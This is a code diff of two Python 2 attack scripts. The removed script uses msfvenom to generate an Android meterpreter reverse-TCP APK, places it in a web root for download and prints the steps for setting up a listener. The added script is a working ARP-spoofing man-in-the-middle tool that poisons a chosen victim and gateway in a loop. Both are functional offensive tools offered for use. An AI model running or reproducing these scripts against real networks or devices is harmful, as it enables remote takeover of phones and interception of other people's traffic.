@@ -1,62 +1,65 @@
-import socket
+from scapy.all import *
+import sys
 import os
-import argparse
-from subprocess import Popen, PIPE, STDOUT
-from shutil import copyfile
-
-class createAPK:
-    def get_ip_address(self):
-        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-        s.connect(("8.8.8.8", 80))
-        return s.getsockname()[0]
-    
-    def launchProcess(self,command):
-        p = Popen(command, stdout = PIPE, 
-            stderr = STDOUT, shell = True)
-        for line in p.stdout:
-            print line.replace('\n', '')
-        return 0
-    
-    def create(self, app_name, lp):
-        
-        ipl = self.get_ip_address()
-        print ipl
-        com = "msfvenom -p android/meterpreter/reverse_tcp LHOST="+ipl+" LPORT="+lp[0]+" R >"+app_name[0]+".apk"
-        
-        self.launchProcess(com)
-        copyfile(app_name[0] + ".apk", "/var/www/html/upload.apk")
-        
-        return ipl
-        
-##PARSER SHIT
-parser = argparse.ArgumentParser(description='Testing')
-        #parser.add_argument('ip_remota', metavar='ipr', type=str, nargs='+',
-                            #help='ip remota')
-parser.add_argument('app_name', metavar='name', type=str, nargs='+',
-                    help='nombre de la app')
-parser.add_argument('lp', metavar='lp', type=str, nargs='+',
-                    help='local port')
-parser.add_argument('ipr', metavar='ipr', type=str, nargs='+',
-                    help='remote ip')
-args = parser.parse_args()
-##//PARSER SHIT---------
-print "lp: " + args.lp[0] + "app_name: " + args.app_name[0] + " ipr: " + args.ipr[0]
-print "Iniciando postgresql..."
-APK = createAPK()
-APK.launchProcess("service postgresql start")
-print "Iniciando msfconsole en nueva ventana..."
-APK.launchProcess("gnome-terminal -e 'bash -c \"msfconsole; exec bash\"'")
-APK = createAPK()
-print "Generando APK..."
-ipl = APK.create(args.app_name, args.lp)
-print "--usa esta guia--"
-print "use exploit/multi/handler"
-print "set payload android/meterpreter/reverse_tcp"
-print "set LHOST " + ipl
-print "set LPORT "+ args.lp[0]
-print "exploit"
-
-
-raw_input("Presiona una tecla cuando hayas configurado el handler...")
+import time
+ 
+try:
+        interface = raw_input("[*] Enter Desired Interface: ")
+        victimIP = raw_input("[*] Enter Victim IP: ")
+        gateIP = raw_input("[*] Enter Router IP: ")
+except KeyboardInterrupt:
+        print "\n[*] User Requested Shutdown"
+        print "[*] Exiting..."
+        sys.exit(1)
+ 
+print "\n[*] Enabling IP Forwarding...\n"
+os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
+ 
+def get_mac(IP):
+        conf.verb = 0
+        ans, unans = srp(Ether(dst = "ff:ff:ff:ff:ff:ff")/ARP(pdst = IP), timeout = 2, iface = interface, inter = 0.1)
+        for snd,rcv in ans:
+                return rcv.sprintf(r"%Ether.src%")
+ 
+def reARP():
+       
+        print "\n[*] Restoring Targets..."
+        victimMAC = get_mac(victimIP)
+        gateMAC = get_mac(gateIP)
+        send(ARP(op = 2, pdst = gateIP, psrc = victimIP, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = victimMAC), count = 7)
+        send(ARP(op = 2, pdst = victimIP, psrc = gateIP, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = gateMAC), count = 7)
+        print "[*] Disabling IP Forwarding..."
+        os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
+        print "[*] Shutting Down..."
+        sys.exit(1)
+ 
+def trick(gm, vm):
+        send(ARP(op = 2, pdst = victimIP, psrc = gateIP, hwdst= vm))
+        send(ARP(op = 2, pdst = gateIP, psrc = victimIP, hwdst= gm))
+ 
+def mitm():
+        try:
+                victimMAC = get_mac(victimIP)
+        except Exception:
+                os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")            
+                print "[!] Couldn't Find Victim MAC Address"
+                print "[!] Exiting..."
+                sys.exit(1)
+        try:
+                gateMAC = get_mac(gateIP)
+        except Exception:
+                os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")            
+                print "[!] Couldn't Find Gateway MAC Address"
+                print "[!] Exiting..."
+                sys.exit(1)
+        print "[*] Poisoning Targets..."       
+        while 1:
+                try:
+                        trick(gateMAC, victimMAC)
+                        time.sleep(1.5)
+                except KeyboardInterrupt:
+                        reARP()
+                        break
+mitm()
 
 
